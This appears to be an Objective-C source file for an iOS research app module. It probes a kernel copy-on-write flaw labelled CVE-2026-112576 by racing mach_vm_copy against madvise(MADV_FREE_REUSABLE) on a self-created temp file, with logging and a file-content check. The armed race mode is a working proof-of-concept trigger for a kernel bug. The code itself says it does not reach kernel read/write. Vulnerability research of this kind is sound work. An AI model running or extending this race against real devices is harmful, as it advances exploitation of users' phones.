#import "KPCoWProbeModule.h"

#import <errno.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <pthread.h>
#import <stdarg.h>
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <sys/mman.h>
#import <sys/stat.h>
#import <unistd.h>

#ifndef KP_COW112576_ENABLE_ARMED
#define KP_COW112576_ENABLE_ARMED 0
#endif

#define KP_COW_PAGE_SIZE 0x4000
#define KP_COW_ITERATIONS 256

extern kern_return_t mach_vm_copy(vm_map_t target_task,
                                  mach_vm_address_t source_address,
                                  mach_vm_size_t size,
                                  mach_vm_address_t dest_address);

static const char KPCoWOriginal[] = "COW112576-READONLY-FILE-PAGE-ORIGINAL-DO-NOT-CHANGE!!!!!!!!!";
static const char KPCoWPayload[] = "COW112576-PRIVATE-COW-DESTINATION-EXPECTED-NOT-IN-FILE!!!!";

@interface KPCoWProbeModule ()
@property (nonatomic, copy, readwrite) NSString *identifier;
@property (nonatomic, copy, readwrite) NSString *title;
@property (nonatomic, copy, readwrite) NSString *subtitle;
@property (nonatomic, copy, readwrite) NSString *icon;
@property (nonatomic, assign, readwrite) KPTestSection section;
@end

typedef struct {
    int fd;
    char path[256];
    uint8_t *destination;
    uint8_t *source;
} KPCoWSession;

typedef struct {
    int descriptor;
    NSString *path;
    _Atomic int failed;
} KPCoWJournal;

typedef struct {
    pthread_mutex_t mutex;
    pthread_cond_t condition;
    unsigned ready;
    BOOL go;
} KPCoWGate;

typedef struct {
    KPCoWGate *gate;
    KPCoWJournal *journal;
    uint32_t iteration;
    KPCoWSession *session;
    BOOL copyOperation;
    int result;
} KPCoWCall;

static BOOL KPCoWWriteAll(int descriptor, const void *bytes, size_t length) {
    size_t offset = 0;
    while (offset < length) {
        ssize_t written = write(descriptor, (const uint8_t *)bytes + offset, length - offset);
        if (written > 0) {
            offset += (size_t)written;
            continue;
        }
        if (written < 0 && errno == EINTR) continue;
        return NO;
    }
    return YES;
}

static BOOL KPCoWJournalWrite(KPCoWJournal *journal, const char *format, ...) {
    if (!journal || journal->descriptor < 0 || atomic_load(&journal->failed)) return NO;
    char line[1024];
    va_list arguments;
    va_start(arguments, format);
    int length = vsnprintf(line, sizeof(line) - 1, format, arguments);
    va_end(arguments);
    if (length < 0 || (size_t)length >= sizeof(line) - 1) {
        atomic_store(&journal->failed, EOVERFLOW);
        return NO;
    }
    line[length] = '\n';
    if (!KPCoWWriteAll(journal->descriptor, line, (size_t)length + 1) || fsync(journal->descriptor) != 0) {
        atomic_store(&journal->failed, errno);
        return NO;
    }
    return YES;
}

static BOOL KPCoWJournalStart(KPCoWJournal *journal, NSMutableString *report) {
    memset((void *)journal, 0, sizeof(*journal));
    journal->descriptor = -1;
    NSString *documents = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSError *error = nil;
    if (![[NSFileManager defaultManager] createDirectoryAtPath:documents
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:&error]) {
        [report appendFormat:@"Journal directory failed: %@\n", error.localizedDescription];
        return NO;
    }
    journal->path = [documents stringByAppendingFormat:@"kexproofv3-cow112576-race-%lld.log",
                      (long long)mach_continuous_time()];
    journal->descriptor = open(journal->path.fileSystemRepresentation,
                               O_WRONLY | O_CREAT | O_EXCL | O_APPEND | O_CLOEXEC, 0600);
    if (journal->descriptor < 0) {
        [report appendFormat:@"Journal open failed: errno=%d (%s)\n", errno, strerror(errno)];
        return NO;
    }
    if (!KPCoWJournalWrite(journal, "JOURNAL version=1 cve=CVE-2026-112576 iterations=%u", KP_COW_ITERATIONS)) {
        close(journal->descriptor);
        journal->descriptor = -1;
        return NO;
    }
    [report appendFormat:@"Race journal (write+fsync): %@\n", journal->path];
    return YES;
}

static void KPCoWJournalFinish(KPCoWJournal *journal) {
    if (journal->descriptor >= 0) {
        fsync(journal->descriptor);
        close(journal->descriptor);
        journal->descriptor = -1;
    }
}

static void KPCoWAppendError(NSMutableString *report, const char *operation, int error) {
    [report appendFormat:@"    %s failed: %d (%s)\n", operation, error, strerror(error)];
}

static void KPCoWSessionInit(KPCoWSession *session) {
    memset(session, 0, sizeof(*session));
    session->fd = -1;
    session->destination = MAP_FAILED;
    session->source = MAP_FAILED;
}

static void KPCoWSessionClose(KPCoWSession *session, BOOL preserve, NSMutableString *report) {
    if (session->destination != MAP_FAILED) {
        munmap(session->destination, KP_COW_PAGE_SIZE);
        session->destination = MAP_FAILED;
    }
    if (session->source != MAP_FAILED) {
        munmap(session->source, KP_COW_PAGE_SIZE);
        session->source = MAP_FAILED;
    }
    if (session->fd >= 0) {
        close(session->fd);
        session->fd = -1;
    }
    if (session->path[0]) {
        if (preserve) {
            [report appendFormat:@"    Evidence temp file preserved: %s\n", session->path];
        } else {
            unlink(session->path);
        }
        session->path[0] = '\0';
    }
}

static BOOL KPCoWFileMatches(KPCoWSession *session) {
    uint8_t bytes[sizeof(KPCoWOriginal)];
    memset(bytes, 0, sizeof(bytes));
    ssize_t result = pread(session->fd, bytes, sizeof(KPCoWOriginal) - 1, 0);
    return result == (ssize_t)(sizeof(KPCoWOriginal) - 1) &&
           memcmp(bytes, KPCoWOriginal, sizeof(KPCoWOriginal) - 1) == 0;
}

static BOOL KPCoWPrepare(KPCoWSession *session, NSMutableString *report) {
    KPCoWSessionInit(session);
    NSString *documents = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
    NSError *error = nil;
    if (![[NSFileManager defaultManager] createDirectoryAtPath:documents
                                  withIntermediateDirectories:YES
                                                   attributes:nil
                                                        error:&error]) {
        [report appendFormat:@"    Documents directory failed: %@\n", error.localizedDescription];
        return NO;
    }
    snprintf(session->path, sizeof(session->path), "%s/cow112576-%lld.bin",
             documents.fileSystemRepresentation, (long long)mach_continuous_time());
    session->fd = open(session->path, O_RDWR | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
    if (session->fd < 0) {
        KPCoWAppendError(report, "open temp", errno);
        return NO;
    }
    if (!KPCoWWriteAll(session->fd, KPCoWOriginal, sizeof(KPCoWOriginal) - 1) || fsync(session->fd) != 0) {
        KPCoWAppendError(report, "write original", errno);
        return NO;
    }
    session->destination = mmap(NULL, KP_COW_PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, session->fd, 0);
    if (session->destination == MAP_FAILED) {
        KPCoWAppendError(report, "mmap file private rw", errno);
        return NO;
    }
    session->source = mmap(NULL, KP_COW_PAGE_SIZE, PROT_READ | PROT_WRITE,
                           MAP_ANON | MAP_PRIVATE, -1, 0);
    if (session->source == MAP_FAILED) {
        KPCoWAppendError(report, "mmap anonymous source", errno);
        return NO;
    }
    memcpy(session->source, KPCoWPayload, sizeof(KPCoWPayload) - 1);
    if (madvise(session->destination, KP_COW_PAGE_SIZE, MADV_FREE_REUSABLE) != 0) {
        KPCoWAppendError(report, "madvise file private MADV_FREE_REUSABLE", errno);
        return NO;
    }
    [report appendString:@"    Prerequisite: writable private file mapping accepts MADV_FREE_REUSABLE; no system file is used.\n"];
    kern_return_t kr = mach_vm_copy(mach_task_self(), (mach_vm_address_t)session->source,
                                    KP_COW_PAGE_SIZE, (mach_vm_address_t)session->destination);
    if (kr != KERN_SUCCESS) {
        [report appendFormat:@"    benign mach_vm_copy failed: kr=%d (%s)\n", kr, mach_error_string(kr)];
        return NO;
    }
    if (memcmp(session->destination, KPCoWPayload, sizeof(KPCoWPayload) - 1) != 0) {
        [report appendString:@"    Baseline destination does not contain the expected private copy.\n"];
        return NO;
    }
    if (!KPCoWFileMatches(session)) {
        [report appendString:@"    Baseline file content changed unexpectedly before the race.\n"];
        return NO;
    }
    [report appendString:@"  BASELINE PASS: private destination changed; pread file content still matches original.\n"];
    return YES;
}

static void KPCoWArriveAndWait(KPCoWGate *gate) {
    pthread_mutex_lock(&gate->mutex);
    gate->ready++;
    pthread_cond_broadcast(&gate->condition);
    while (!gate->go) pthread_cond_wait(&gate->condition, &gate->mutex);
    pthread_mutex_unlock(&gate->mutex);
}

static void *KPCoWCallThread(void *context) {
    KPCoWCall *call = context;
    KPCoWArriveAndWait(call->gate);
    if (call->copyOperation) {
        call->result = mach_vm_copy(mach_task_self(), (mach_vm_address_t)call->session->source,
                                    KP_COW_PAGE_SIZE, (mach_vm_address_t)call->session->destination);
    } else {
        call->result = madvise(call->session->destination, KP_COW_PAGE_SIZE, MADV_FREE_REUSABLE);
    }
    KPCoWJournalWrite(call->journal, "RETURN iteration=%u operation=%s result=%d",
                      call->iteration, call->copyOperation ? "mach_vm_copy" : "madvise", call->result);
    return NULL;
}

static BOOL KPCoWStartGate(KPCoWGate *gate) {
    memset(gate, 0, sizeof(*gate));
    if (pthread_mutex_init(&gate->mutex, NULL) != 0) return NO;
    if (pthread_cond_init(&gate->condition, NULL) != 0) {
        pthread_mutex_destroy(&gate->mutex);
        return NO;
    }
    return YES;
}

static BOOL KPCoWRunOneRace(KPCoWSession *session, KPCoWJournal *journal, uint32_t iteration,
                            NSMutableString *report, BOOL *fileChanged) {
    if (madvise(session->destination, KP_COW_PAGE_SIZE, MADV_FREE_REUSABLE) != 0) {
        KPCoWAppendError(report, "pre-race madvise reset", errno);
        return NO;
    }
    if (!KPCoWJournalWrite(journal, "BEGIN iteration=%u file=%s dest=%p source=%p",
                          iteration, session->path, session->destination, session->source)) {
        [report appendString:@"    Journal write/fsync failed before race; calls withheld.\n"];
        return NO;
    }
    KPCoWGate gate;
    if (!KPCoWStartGate(&gate)) {
        [report appendString:@"    pthread gate initialization failed.\n"];
        return NO;
    }
    KPCoWCall calls[2];
    memset(calls, 0, sizeof(calls));
    for (NSUInteger index = 0; index < 2; index++) {
        calls[index].gate = &gate;
        calls[index].journal = journal;
        calls[index].iteration = iteration;
        calls[index].session = session;
        calls[index].copyOperation = index == 0;
        calls[index].result = -1;
    }
    pthread_t copyThread;
    pthread_t adviceThread;
    int copyRC = pthread_create(&copyThread, NULL, KPCoWCallThread, &calls[0]);
    int adviceRC = copyRC == 0 ? pthread_create(&adviceThread, NULL, KPCoWCallThread, &calls[1]) : -1;
    if (copyRC != 0 || adviceRC != 0) {
        pthread_mutex_lock(&gate.mutex);
        gate.go = YES;
        pthread_cond_broadcast(&gate.condition);
        pthread_mutex_unlock(&gate.mutex);
        if (copyRC == 0) pthread_join(copyThread, NULL);
        pthread_cond_destroy(&gate.condition);
        pthread_mutex_destroy(&gate.mutex);
        [report appendFormat:@"    pthread_create failed copy=%d advice=%d\n", copyRC, adviceRC];
        return NO;
    }
    pthread_mutex_lock(&gate.mutex);
    while (gate.ready != 2) pthread_cond_wait(&gate.condition, &gate.mutex);
    gate.go = YES;
    pthread_cond_broadcast(&gate.condition);
    pthread_mutex_unlock(&gate.mutex);
    pthread_join(copyThread, NULL);
    pthread_join(adviceThread, NULL);
    pthread_cond_destroy(&gate.condition);
    pthread_mutex_destroy(&gate.mutex);

    *fileChanged = !KPCoWFileMatches(session);
    KPCoWJournalWrite(journal, "END iteration=%u copy_kr=%d madvise_rc=%d file_changed=%u",
                      iteration, calls[0].result, calls[1].result, *fileChanged);
    if (iteration < 8 || (iteration + 1) % 32 == 0 || *fileChanged) {
        [report appendFormat:@"  race[%03u] copy_kr=%d madvise=%d file_changed=%s\n",
         iteration, calls[0].result, calls[1].result, *fileChanged ? "YES" : "no"];
    }
    return YES;
}

@implementation KPCoWProbeModule

- (instancetype)init {
    return [self initWithArmed:NO];
}

- (instancetype)initWithArmed:(BOOL)armed {
    self = [super init];
    if (self) {
        _armed = armed;
        _identifier = armed ? @"cow112576.race" : @"cow112576.probe";
        _title = armed ? @"CoW 112576 File Race" : @"CoW 112576 Baseline";
        _subtitle = armed ? @"ARMED 256 mach_vm_copy/MADV_FREE_REUSABLE races on one temp file; pread oracle"
                          : @"Safe private file CoW copy and original-content validation";
        _icon = armed ? @"exclamationmark.triangle" : @"doc.on.doc";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (NSString *)runReport {
    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== CVE-2026-112576 CoW / MADV_FREE_REUSABLE probe ===\n"];
    [report appendString:@"Target: iPhone16,1 / iOS 27.0.1. One private temp file, 0x4000-byte page; no system file modification.\n"];
#if !KP_COW112576_ENABLE_ARMED
    if (self.isArmed) {
        [report appendString:@"ARMED NOT COMPILED: KP_COW112576_ENABLE_ARMED=1 is required.\n"];
        return report;
    }
#endif
    KPCoWSession session;
    if (!KPCoWPrepare(&session, report)) {
        KPCoWSessionClose(&session, NO, report);
        [report appendString:@"BASELINE FAILED: race withheld; this is not a negative CVE verdict.\n"];
        return report;
    }
    if (!self.isArmed) {
        KPCoWSessionClose(&session, NO, report);
        [report appendString:@"Race: NOT TESTED in safe row. File-backed overwrite and usable primitive are not claimed.\n"];
        return report;
    }

    KPCoWJournal journal;
    if (!KPCoWJournalStart(&journal, report)) {
        KPCoWSessionClose(&session, NO, report);
        return report;
    }
    uint32_t completed = 0;
    BOOL fileChanged = NO;
    for (uint32_t iteration = 0; iteration < KP_COW_ITERATIONS; iteration++) {
        if (!KPCoWRunOneRace(&session, &journal, iteration, report, &fileChanged)) break;
        completed++;
        if (fileChanged) break;
    }
    KPCoWJournalWrite(&journal, "SUMMARY completed=%u file_changed=%u", completed, fileChanged);
    KPCoWJournalFinish(&journal);
    [report appendFormat:@"RACE SUMMARY: completed=%u file_changed=%s\n", completed, fileChanged ? "YES" : "no"];
    if (fileChanged) {
        [report appendString:@"POSITIVE ORACLE: original file bytes differ from the original content. This is a CoW overwrite candidate, not yet controlled kernel R/W.\n"];
    } else {
        [report appendString:@"No file-backed overwrite observed in this bounded run. This is not proof that the CVE is absent.\n"];
    }
    if (mprotect(session.destination, KP_COW_PAGE_SIZE, PROT_READ) == 0) {
        [report appendString:@"Final mapping was made read-only before cleanup.\n"];
    }
    KPCoWSessionClose(&session, fileChanged, report);
    [report appendString:@"Primitive assessment: only original-file memcmp oracle; no arbitrary target, kernel address or kernel R/W was used.\n"];
    return report;
}

@end
